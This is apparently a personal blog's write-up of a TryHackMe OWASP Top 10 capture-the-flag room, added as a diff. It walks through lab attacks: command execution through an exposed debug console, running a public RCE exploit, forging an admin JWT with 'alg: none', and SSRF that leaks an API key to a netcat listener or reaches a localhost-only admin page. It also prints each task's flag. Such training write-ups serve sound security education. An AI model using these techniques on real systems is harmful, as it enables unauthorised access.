@@ -1,0 +1,362 @@
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"
+"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" lang="en" xml:lang="en">
+<head>
+<meta http-equiv="Content-Type" content="text/html;charset=utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>OWASP Top 10 2021</title>
+<meta name="generator" content="Org mode" />
+<link rel='stylesheet' href='/css/default.css' />
+<link rel='stylesheet' href='/css/source-code.css' />
+</head>
+<body>
+<div id="preamble" class="status">
+<h1 id='site-name'>Bryan Rinders</h1>
+<div id='menu'>
+  <a href='/'>Home</a>
+  <a href='/ctf-index.html'>CTF WriteUps</a>
+  <a href='/emacs-index.html'>Emacs</a>
+  <a href='/linux-index.html'>Linux Tutorials</a>
+  <a href='https://gitlab.com/bryos/dotfiles' target='_blank'>Dotfiles</a>
+  <a href='/other-index.html'>Other</a>
+  <span class='right'>
+    <a href='/sitemap.html'>Sitemap</a>
+  </span>
+</div>
+<br><hr>
+</div>
+<div id="content">
+<h1 class="title">OWASP Top 10 2021</h1>
+<div id="table-of-contents">
+<h2>Table of Contents</h2>
+<div id="text-table-of-contents">
+<ul>
+<li><a href="#Task-11-Insecure-design">Task 11 Insecure design</a></li>
+<li><a href="#Task-12-Security-Misconfiguration">Task 12 Security Misconfiguration</a></li>
+<li><a href="#Task-15-Vulnerable-And-Outdated-Components">Task 15 Vulnerable And Outdated Components</a></li>
+<li><a href="#Task-20-Data-Integrity-Failures">Task 20 Data Integrity Failures</a></li>
+<li><a href="#Task-21-Security-Logging-And-Monitoring-Failures">Task 21 Security Logging And Monitoring Failures</a></li>
+<li><a href="#Task-22-Server-Side-Request-Forgery">Task 22 Server Side Request Forgery</a></li>
+</ul>
+</div>
+</div>
+<p>
+<span class="timestamp-wrapper"><span class="timestamp">[2023-10-25 Wed]</span></span>
+</p>
+
+<p>
+Write up for the challenges in the tryhackme room <a href="https://tryhackme.com/room/owasptop102021">OWASP Top 10 2021</a>.
+</p>
+
+<div id="outline-container-org5d53faf" class="outline-2">
+<h2 id="Task-11-Insecure-design"><a href="#Task-11-Insecure-design">Task 11 Insecure design</a></h2>
+<div class="outline-text-2" id="text-Task-11-Insecure-design">
+<p>
+Visit the page <code>ht​tp://MACHINE_IP:PORT</code> and click on the 'I forgot my
+password' link and enter the username <code>joseph</code>. You will be brought to
+a page where you have to answer a security question. Two questions
+might be easily guessed:
+</p>
+<ul class="org-ul">
+<li><p>
+What is you first pet's current address?
+</p>
+
+<p>
+With possible answers:
+</p>
+<ul class="org-ul">
+<li>Heaven</li>
+<li>Hell</li>
+</ul></li>
+
+<li><p>
+What is your favourite color?
+</p>
+
+<p>
+Possible answers:
+</p>
+<ul class="org-ul">
+<li>blue</li>
+<li>green</li>
+<li>black</li>
+<li>red</li>
+</ul></li>
+</ul>
+
+<p>
+After trying these answers it turns out <code>green</code> is joseph's favourite
+color. We are given a new password with which we can login to his
+account and read the flag from <code>flag.txt</code>.
+</p>
+
+<pre class="example">
+THM{Not_3ven_c4tz_c0uld_sav3_U!}
+</pre>
+</div>
+</div>
+
+<div id="outline-container-org082db26" class="outline-2">
+<h2 id="Task-12-Security-Misconfiguration"><a href="#Task-12-Security-Misconfiguration">Task 12 Security Misconfiguration</a></h2>
+<div class="outline-text-2" id="text-Task-12-Security-Misconfiguration">
+<p>
+Go to <code>h​ttp://MACHINE_IP:PORT/console</code> and enter in the console
+</p>
+
+<div class="org-src-container">
+<pre class="src src-python"><span class="org-keyword">import</span> os; <span class="org-keyword">print</span>(os.popen(<span class="org-string">"ls -l"</span>).read())
+</pre>
+</div>
+
+<p>
+The database file name is: <code>todo.db</code>.
+</p>
+
+<p>
+To get the value of <code>secret_flag</code> inside <code>app.py</code> run from the console:
+</p>
+
+<div class="org-src-container">
+<pre class="src src-python"><span class="org-keyword">print</span>(os.popen(<span class="org-string">"grep secret_flag app.py"</span>).read())
+</pre>
+</div>
+
+<p>
+The flag is:
+</p>
+
+<pre class="example">
+THM{Just_a_tiny_misconfiguration}
+</pre>
+</div>
+</div>
+
+<div id="outline-container-orgfdbf537" class="outline-2">
+<h2 id="Task-15-Vulnerable-And-Outdated-Components"><a href="#Task-15-Vulnerable-And-Outdated-Components">Task 15 Vulnerable And Outdated Components</a></h2>
+<div class="outline-text-2" id="text-Task-15-Vulnerable-And-Outdated-Components">
+<p>
+Go to the page <code>h​ttp://MACHINE_IP:PORT</code>. After look around the website
+for a bit the most interesting page in the admin login page. Trying
+<code>admin:admin</code> as <code>username:password</code> turns out to actually work. After
+some more browsing it is unclear what to do so the hint suggests to
+search for 'remote command executions in bookstore app', which bring
+up <a href="https://www.exploit-db.com/exploits/47887">https://www.exploit-db.com/exploits/47887</a>. Downloading this script
+to the attackbox and executing it with:
+</p>
+
+<div class="org-src-container">
+<pre class="src src-sh">python 47887.py
+</pre>
+</div>
+
+<p>
+results in RCE. Type <code>y</code> when prompted on the command line and
+</p>
+
+<div class="org-src-container">
+<pre class="src src-sh">cat /opt/flag.txt
+</pre>
+</div>
+
+<p>
+to get the flag
+</p>
+
+<pre class="example">
+THM{But_1ts_n0t_my_f4ult!}
+</pre>
+</div>
+</div>
+
+<div id="outline-container-org811fe7d" class="outline-2">
+<h2 id="Task-20-Data-Integrity-Failures"><a href="#Task-20-Data-Integrity-Failures">Task 20 Data Integrity Failures</a></h2>
+<div class="outline-text-2" id="text-Task-20-Data-Integrity-Failures">
+<p>
+The password for the <code>guest</code> account is <code>guest</code>.
+</p>
+
+<p>
+Find the cookie as described in the task description and <code>base64</code>
+decode the first two values.
+</p>
+
+<pre class="example">
+eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6Imd1ZXN0IiwiZXhwIjoxNjk4MzAwNTI0fQ.BVUSmKNixf99vZZdga_n9QRJL2WwoGbKYSe1xF6yD0M
+</pre>
+
+<div class="org-src-container">
+<pre class="src src-sh"><span class="org-builtin">echo</span> <span class="org-string">"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9"</span> | base64 -d
+<span class="org-builtin">echo</span>
+<span class="org-builtin">echo</span> <span class="org-string">"eyJ1c2VybmFtZSI6Imd1ZXN0IiwiZXhwIjoxNjk4Mjk4ODUxfQ=="</span> | base64 -d
+</pre>
+</div>
+
+<pre class="example">
+{"typ":"JWT","alg":"HS256"}
+{"username":"guest","exp":1698298851}
+</pre>
+
+
+<p>
+Note that the second decoded value must be padded with two <code>=</code> signs,
+because there must be a multiple of 4 characters in the encoded
+string.
+</p>
+
+<p>
+Now change the <code>username</code> to 'admin' and the <code>alg</code> to 'none' and
+base64 encode those strings.
+</p>
+
+<div class="org-src-container">
+<pre class="src src-sh"><span class="org-builtin">echo</span> <span class="org-string">'{"username":"admin","exp":1698298851}'</span> | base64
+<span class="org-builtin">echo</span> <span class="org-string">'{"typ":"JWT","alg":"none"}'</span> | base64
+</pre>
+</div>
+
+<pre class="example">
+eyJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjoxNjk4Mjk4ODUxfQo=
+eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0K
+</pre>
+
+
+<p>
+replace the cookie values with the new encoded values seperated with a
+dot (do not include the original signature)
+</p>
+
+<pre class="example">
+eyJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjoxNjk4Mjk4ODUxfQo=.eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0K.
+</pre>
+
+<p>
+Refresh the web pages to get the flag:
+</p>
+
+<pre class="example">
+THM{Dont_take_cookies_from_strangers}
+</pre>
+</div>
+</div>
+
+<div id="outline-container-orgba5da65" class="outline-2">
+<h2 id="Task-21-Security-Logging-And-Monitoring-Failures"><a href="#Task-21-Security-Logging-And-Monitoring-Failures">Task 21 Security Logging And Monitoring Failures</a></h2>
+<div class="outline-text-2" id="text-Task-21-Security-Logging-And-Monitoring-Failures">
+<p>
+When you open the supplied file it is obvious the IP of the attacker
+is:
+</p>
+
+<pre class="example">
+49.99.13.16
+</pre>
+
+<p>
+And the type of attack is:
+</p>
+
+<pre class="example">
+brute force
+</pre>
+</div>
+</div>
+
+<div id="outline-container-orgb3a433f" class="outline-2">
+<h2 id="Task-22-Server-Side-Request-Forgery"><a href="#Task-22-Server-Side-Request-Forgery">Task 22 Server Side Request Forgery</a></h2>
+<div class="outline-text-2" id="text-Task-22-Server-Side-Request-Forgery">
+<p>
+Go to the admin area, it will tell you only <code>localhost</code> can login as
+admin.
+</p>
+
+<p>
+Checking the source of the home page of this website you can see that
+the <code>download resume</code> button points to:
+</p>
+
+<pre class="example">
+secure-file-storage.com
+</pre>
+
+<p>
+To get the API key, open a terminal on the attackbox and run:
+</p>
+
+<div class="org-src-container">
+<pre class="src src-sh">nc -lvp 8080
+</pre>
+</div>
+
+<p>
+then via the browser go to
+<a href="http://machine_ip:port/ATTACKBOX_IP:8080&amp;id=1">http://machine_ip:port/ATTACKBOX_IP:8080&amp;id=1</a> the API key wil then be
+shown on the netcat terminal:
+</p>
+
+<pre class="example">
+THM{Hello_Im_just_an_API_key}
+</pre>
+</div>
+
+<div id="outline-container-org6174e72" class="outline-3">
+<h3 id="Extra-Mile"><a href="#Extra-Mile">Extra Mile</a></h3>
+<div class="outline-text-3" id="text-Extra-Mile">
+<p>
+Because the admin page is only accessible from <code>localhost</code> we can do
+the same trick as before but instead of using <code>netcat</code> you use
+<code>localhost</code> as the server, with <code>/admin</code> as path. However if you try
+to go to
+<a href="http://machine_ip:port/download?server=localhost:8087/admin&amp;id=1">http://machine_ip:port/download?server=localhost:8087/admin&amp;id=1</a> you
+will notice that it downloads <code>download.pdf</code>, which is empty. We need
+to somehow make the server ignore the <code>id</code> (we can not leave <code>id</code> out
+of the url). A trick to do this is to use the pound sign, <code>#</code>. The
+pound sign must be url encode, <code>%23</code>, to have the server decode it and
+send a request to <a href="http://localhost:8087/admin#&amp;id=1">http://localhost:8087/admin#&amp;id=1</a> which will then ignore
+the <code>id</code> value.
+</p>
+
+<p>
+So the attack url will be:
+<a href="http://machine_ip:port/download?server=localhost:8087/admin%23&amp;id=1">http://machine_ip:port/download?server=localhost:8087/admin%23&amp;id=1</a>
+</p>
+
+<p>
+And the flag is:
+</p>
+
+<pre class="example">
+thm{c4n_i_haz_flagz_plz?}
+</pre>
+</div>
+</div>
+</div>
+</div>
+<div id="postamble" class="status">
+<br><br>
+<div style='text-align: center;'>
+  If something is not working, please create an issue
+  <a href='https://gitlab.com/bryanrinders/bryanrinders.xyz/-/issues'>here</a>
+  .
+</div>
+<br><hr/>
+<footer>
+  <div class='copyright-container'>
+    <div class='copyright'>
+      Copyright &copy; 2022-2023 Bryan Rinders some rights reserved
+      <br><br>
+      This page is available under a
+      <a rel='license' href='http://creativecommons.org/licenses/by/4.0/'>
+        CC-BY 4.0
+      </a> licence.
+    </div>
+  </div>
+  <br>
+  <div class='generated'>
+    Created with <a href="https://www.gnu.org/software/emacs/">Emacs</a> 27.1 (<a href="https://orgmode.org">Org</a> mode 9.3) on <a href='https://www.gnu.org'>GNU</a>/<a href='https://www.kernel.org/'>Linux</a>
+  </div>
+</footer>
+</div>
+</body>
+</html>
